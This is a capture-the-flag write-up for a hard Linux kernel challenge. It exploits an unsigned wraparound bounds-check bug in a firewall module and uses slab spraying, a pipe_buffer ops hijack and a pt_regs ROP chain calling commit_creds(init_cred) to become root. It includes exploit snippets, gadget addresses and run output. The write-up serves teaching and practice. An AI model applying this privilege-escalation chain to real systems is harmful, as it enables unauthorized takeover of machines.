# throughthewall

**Category:** Kernel Pwn | **Difficulty:** Hard | **Flag:** `bctf{fake_flag_replace_with_real}`

## TL;DR

A vulnerable kernel module (`/dev/firewall`) has a u64 wraparound bounds-check bug that gives us OOB read/write into adjacent slab chunks. We spray pipes and firewall rules into the same kmalloc-1024 slab, find an adjacent `pipe_buffer`, poison its `ops` pointer to a fake vtable we control, and trigger `ops->release` on `close()`. The release handler pivots RSP into pt_regs (the saved syscall register state on the kernel stack), where we've pre-loaded a ROP chain that calls `commit_creds(init_cred)` and returns to userspace as root.

## What We're Given

A QEMU VM image (`bzImage` + `initramfs.cpio.gz`) running Linux 5.15.167 with a custom kernel module at `/dev/firewall`. The boot flags are:

```
pti=on kaslr smep smap
```

On paper, that's the full modern Linux hardening stack: KASLR randomizes kernel addresses, SMEP prevents the kernel from jumping to user-mode pages, SMAP prevents the kernel from reading/writing user-mode memory without explicit `stac/clac` instructions, and PTI (Meltdown mitigation) separates user/kernel page tables.

The user inside the VM is `ctf` (uid 1000), dropped via `/bin/drop_priv`. The device is world-readable/writable (`chmod 666`), so no privilege needed to trigger the bugs.

## Initial Recon

The first thing to figure out is what the firewall module actually does. We pulled the initramfs and looked at the module. It exposes four ioctls:

| Command | Code | Purpose |
|---------|------|---------|
| ADD | 0x41004601 | Add a firewall rule (parses `SRC_IP DST_IP PORT PROTO ACTION`) |
| DEL | 0x40044602 | Delete a rule by index |
| SHOW | 0x84184604 | Read bytes from a rule's buffer |
| EDIT | 0x44184603 | Write bytes into a rule's buffer |

Internally, the module keeps a `rules[256]` global array where each entry points to a `kmalloc(0x400)` allocation — a 1KB buffer holding the parsed rule data.

The SHOW/EDIT ioctls take a struct with an index, an offset, a length, and a 0x400-byte data buffer:

```c
struct rw_rule {
    int32_t idx;   uint32_t _pad;
    uint64_t offset;
    uint64_t length;
    uint8_t data[0x400];
};
```

Looking at the bounds check in the module:

```c
if (offset + length > 0x400) return -EINVAL;
```

That addition is unsigned 64-bit. Bug spotted.

### Confirming KASLR is actually disabled

The boot command says `kaslr`, but we were suspicious. The module's `fw_show_rule` calls:

```c
printk("fw_show_rule: rules[%d]=%px", idx, rules[idx]);
```

The `%px` format specifier bypasses `kptr_restrict` and always prints the full kernel pointer. Since `dmesg_restrict=0`, any user can read it. We read dmesg and got heap addresses.

Then we used the OOB read (explained below) to leak kernel text pointers out of an adjacent `tty_struct` on the slab. We compared the leaked `ptm_unix98_ops` pointer (`0xffffffff8227ab60`) against the vmlinux symbol table — exact match, zero offset. **KASLR slide confirmed to be 0.** Every kernel symbol we need is at its static address.

## The Vulnerability / Trick

### Bug 1: u64 Wraparound OOB Read/Write

The bounds check `if (offset + length > 0x400)` uses unsigned 64-bit arithmetic. If you set `offset = 0xfffffffffffffc00` and `length = 0x400`, the sum wraps around to exactly 0, which passes the check. The subsequent `memcpy` then uses the original (huge negative) offset, landing `0x400` bytes *before* the rule's buffer — right in the previous slab chunk.

This gives us a 0x400-byte read/write window starting at `rules[idx] - 0x400`, which is exactly one kmalloc-1024 object behind our rule in the slab.

### Bug 2: UAF via Missing NULL After Free

`fw_del_rule` calls `kfree(rules[idx])` but never sets `rules[idx] = NULL`. Subsequent SHOW/EDIT ioctls on that index operate on freed memory. We didn't need this for the final exploit, but it's a solid UAF primitive if you want a different approach.

### Bug 3: dmesg Heap Pointer Leak

The `%px` in the `printk` call is the gift that keeps giving. Every time we call SHOW on any rule index, the kernel logs the rule's heap address to dmesg, readable by our unprivileged user. This gives us the exact address of every rule buffer we allocate.

### The Exploit Strategy: pipe_buffer Ops Hijack

This is the interesting part. With SMEP+SMAP in play, we can't execute shellcode in userspace, and we can't point the kernel at user memory. We need a kernel-space ROP chain.

The technique is a **pipe_buffer ops hijack**. Here's the setup:

- `pipe_buffer` is a kernel struct (in kmalloc-1024) that represents a buffer in a pipe. It has a pointer to an `ops` vtable — a set of function pointers for operations on that buffer.
- One of those function pointers is `release`, which gets called when the pipe buffer is freed (e.g., when you close a pipe).
- If we can overwrite `pipe_buffer.ops` to point at a fake vtable we control in kernel memory, we control what function gets called on `close()`.

The plan:
1. Spray 16 pipes + 32 firewall rules into kmalloc-1024
2. Use the OOB read to scan the chunk behind each rule looking for `anon_pipe_buf_ops` (the legitimate ops pointer, `0xffffffff8221ad80`) — that's our signature for "there's a pipe_buffer here"
3. Build a fake ops table inside a rule buffer (we know its address from the dmesg leak)
4. Use the OOB write to overwrite `pipe_buffer.ops` with our fake ops pointer
5. Close the pipe — this calls `free_pipe_info` → `ops->release` → our gadget

### The pt_regs ROP Trick

With SMEP, we can't jump to shellcode. But we need to somehow get `commit_creds(init_cred)` called. Here's the elegant part:

When the kernel handles a syscall, it saves all userspace register values on the kernel stack in a `pt_regs` structure. That structure looks like:

```
... [on kernel stack] ...
r15  r14  r13  r12  rbp  rbx  r11  r10
r9   r8   rax  rcx  rdx  rsi  rdi  orig_rax
rip  cs   eflags  rsp  ss
```

The key insight: we control r15, r14, r13, r12 — we set them before executing the `syscall` instruction. If our stack pivot (`add rsp, 0xc8; pop rbx; pop rbp; ret`) lands RSP exactly at the r15 slot in pt_regs, then the kernel starts executing our "ROP chain" made entirely of values we put in registers before the syscall.

So the full chain in pt_regs is:
- `r15` = `pop rdi; ret` gadget
- `r14` = address of `init_cred` (the credential struct for the init process, which has uid=0)
- `r13` = address of `commit_creds`
- `r12` = address of `swapgs_restore_regs_and_return_to_usermode` (the kernel's own routine to return cleanly to userspace)

When the pivot fires: `pop rdi; ret` runs (from r15), pops r14 into rdi (so rdi = `init_cred`), then `ret` runs `commit_creds(init_cred)` (from r13), which sets our process's credentials to root. Then `swapgs_restore` restores registers and does `iretq` back to userspace, where we check `getuid() == 0` and print the flag.

## Building the Exploit

### Step 1: Spray and Leak Addresses

We interleave 16 pipe opens with 32 rule additions, so they land in the same kmalloc-1024 slab run. After each rule is added, we drain dmesg to grab its heap address:

```c
uint64_t get_addr(int idx) {
    uint8_t t[8] = {0};
    kmsg_drain();
    fw_show(idx, 0, 8, t);      // triggers the printk with %px
    return read_last_heap();    // parse the address from /dev/kmsg
}
```

We also pin the exploit to CPU 0 with `sched_setaffinity` — this keeps the slab allocations on the same per-CPU freelist and makes the spray much more reliable.

### Step 2: Find the Adjacent pipe_buffer

For each rule, we do an OOB read of the chunk just behind it:

```c
fw_show(rid[i], 0xfffffffffffffc00ULL, 0x400, prev);
```

That `0xfffffffffffffc00` is -0x400 in u64. The bounds check: `(-0x400) + 0x400 = 0` which passes. The memcpy lands 0x400 bytes before the rule — exactly one object behind in the slab.

We scan the 0x400 bytes looking for the `anon_pipe_buf_ops` signature (`0xffffffff8221ad80`). Because `pipe_buffer` is 0x28 bytes long and `ops` is at offset 0x10, we verify that `off % 0x28 == 0x10` before accepting a match. This catches actual pipe_buffer structs rather than data that happens to match.

### Step 3: Build the Fake Ops Table

We know the address of `rules[tr]` from the dmesg leak. We store the fake ops table at `rule_addr + 0x200` (well inside the rule buffer, safe from interference). The `ops->release` function pointer is at offset 0x08 in the ops struct:

```c
uint64_t fops = ta + 0x200;       // ta = rule address from dmesg
uint8_t buf[0x20] = {0};
*(uint64_t*)(buf + 0x08) = PIVOT_GADGET;   // ops->release
fw_edit(rid[tr], 0x200, 0x20, buf);        // write it into the rule buffer
```

`PIVOT_GADGET` (`0xffffffff817d0f3a`) is `add rsp, 0xc8; pop rbx; pop rbp; ret` — found with ROPgadget on vmlinux. This pivots RSP forward by 0xd8 bytes (0xc8 + 8 for pop rbx + 8 for pop rbp) total to land right at the pt_regs r15 slot.

### Step 4: OOB Write — The Tricky Part

This is where we hit our first real bug during development. The naive approach was:

```c
// WRONG — this is what we tried first
fw_edit(rid[tr], ops_offset, 8, &fops);  // where ops_offset ≈ -0x3f0
```

Silently rejected. Why? The offset alone was `0xfffffffffffffc10`, and `0xfffffffffffffc10 + 8 = 0xfffffffffffffc18`. That's bigger than 0x400 and doesn't wrap — so the check rejects it. We need `offset + length` to wrap to ≤ 0x400, which means `length` has to be large enough to push the sum past 2^64.

The fix: use the same `-0x400 + 0x400 = 0` trick as the read. We read the entire previous chunk, patch the ops pointer in-memory, then write the whole chunk back:

```c
uint8_t prev_write[0x400] = {0};
fw_show(rid[tr], 0xfffffffffffffc00ULL, 0x400, prev_write);
*(uint64_t*)(prev_write + poff + 0x10) = fops;   // patch ops field
fw_edit(rid[tr], 0xfffffffffffffc00ULL, 0x400, prev_write);
```

This is a read-modify-write of the full 0x400-byte block. Elegant, and it works because we're writing back the same data except for the one patched pointer.

### Step 5: Trigger with the Right Registers

Before calling `close()` on the pipe write end, we load r15/r14/r13/r12 with our ROP chain values and use inline assembly to do the syscall directly — keeping our registers intact through the syscall boundary:

```c
__asm__ volatile(
    "mov %0, %%r15\n"   // pop_rdi_ret
    "mov %1, %%r14\n"   // INIT_CRED
    "mov %2, %%r13\n"   // commit_creds
    "mov %3, %%r12\n"   // swapgs_restore
    "mov $3, %%rax\n"   // SYS_close
    "mov %4, %%rdi\n"   // fd
    "syscall\n"
    : : "r"(POP_RDI_RET), "r"(INIT_CRED), "r"(COMMIT_CREDS),
        "r"(SWAPGS_RESTORE), "r"((uint64_t)pfd[i][1])
    : "rax", "rdi", "r12", "r13", "r14", "r15", "rcx", "r11", "memory"
);
```

The `close()` syscall goes through `task_work` → `____fput` → `free_pipe_info` → `ops->release` = our PIVOT_GADGET → lands at pt_regs.r15 = `pop rdi; ret` → pops pt_regs.r14 (INIT_CRED) into rdi → calls pt_regs.r13 (`commit_creds`) → `swapgs_restore` → iretq → back in userspace, now uid 0.

### The Second Bug We Hit: Wrong swapgs Entry Point

During debugging, the pivot fired correctly (we confirmed this by setting r15=0xdeadbeef00000001 and watching the kernel oops at that address), but we kept crashing on `iretq`. The stack frame was off by 8 bytes.

The culprit: we were using `swapgs_restore_regs_and_return_to_usermode` at offset `+0x00` (`0xffffffff81e00f71`), which starts with a `pop r12`. That means it consumes one extra value off the stack before doing `mov rdi, rsp` (which needs RSP to point exactly at pt_regs+0x70). Off by 8 bytes → the `iretq` reads wrong values for RIP, CS, RFLAGS, RSP, SS → instant crash.

The fix: enter at `0xffffffff81e00f73` — skip the first `pop r12` (which we no longer need to pop since r12 is our entry gadget, and after `commit_creds` returns to `swapgs_restore` the stack is already at the right position). Two bytes saved our sanity.

## Running It

```
[*] exploit3: pivot depth test
[*] 16 pipes, 32 rules
[+] pipe_buf rule[7] prev+0
[+] rule 7 @ffff888004762400, pipe_slot=0
[+] pipe_buf.ops → ffff888004762600 (release=pivot)
[*] Setting ROP regs and closing pipes...
[*] pipe 0 closed
[*] pipe 1 closed
...
[+] ROOT!
bctf{...}
uid=0(root) gid=0(root)
```

The exploit reliably finds a pipe_buffer in the first few tries of the spray. Occasionally the pipe ends up in a different slot (poff > 0), but the exploit handles all valid slots.

## Key Takeaways

**The wraparound check bug is subtle.** `offset + length > MAX` looks correct, but if both `offset` and `length` are user-controlled u64 values, an attacker can provide a near-UINT64_MAX offset and a complementary length to make the sum wrap to 0. The kernel has had variants of this bug in real code. Always validate offset and length individually (`if (offset > MAX || length > MAX - offset)`), not their sum.

**pt_regs ROP is a beautiful technique.** When you control a kernel function pointer and have SMEP enabled, you're not stuck — any gadget that pivots RSP into the pt_regs frame on the kernel stack turns your syscall registers into a ROP chain. You need: a pivot gadget to align RSP, and enough registers to hold your chain. `commit_creds(init_cred)` is a classic two-gadget privesc in kernel exploits: no heap allocation, no race, just one function call.

**`%px` leaks everything.** The `kptr_restrict` sysctl was added specifically to prevent kernel pointer leaks via printk, but `%px` explicitly bypasses it. If a module uses `%px` in a printk that's reachable by unprivileged users and `dmesg_restrict=0`, you have a free heap leak. In CTF kernel challenges, always check dmesg early.

**Spray tuning matters.** The slab spray (interleaving pipe opens and rule additions) is what makes the pipe_buffer end up adjacent to a rule. The CPU pinning (`sched_setaffinity`) keeps allocations on the same per-CPU slab freelist, dramatically improving spray reliability. Without it, you might get lucky or you might not.

**There were 29 diagnostic iterations.** The diag1.c through diag29.c progression in the challenge directory tells the real story: kernel exploits rarely work on the first try. Each diag was testing a specific hypothesis — is the ops pointer being overwritten? Does the release function actually fire? Is the pivot depth correct? Systematic, incremental testing is the only sane way through.

**Kernel symbols at known addresses:**
```
ANON_PIPE_BUF_OPS = 0xffffffff8221ad80   // pipe ops signature to search for
COMMIT_CREDS      = 0xffffffff81097b80
INIT_CRED         = 0xffffffff82850e80
SWAPGS_RESTORE    = 0xffffffff81e00f73   // enter at pop rbp, NOT pop r12
POP_RDI_RET       = 0xffffffff819c3269
PIVOT_GADGET      = 0xffffffff817d0f3a   // add rsp,0xc8; pop rbx; pop rbp; ret
```
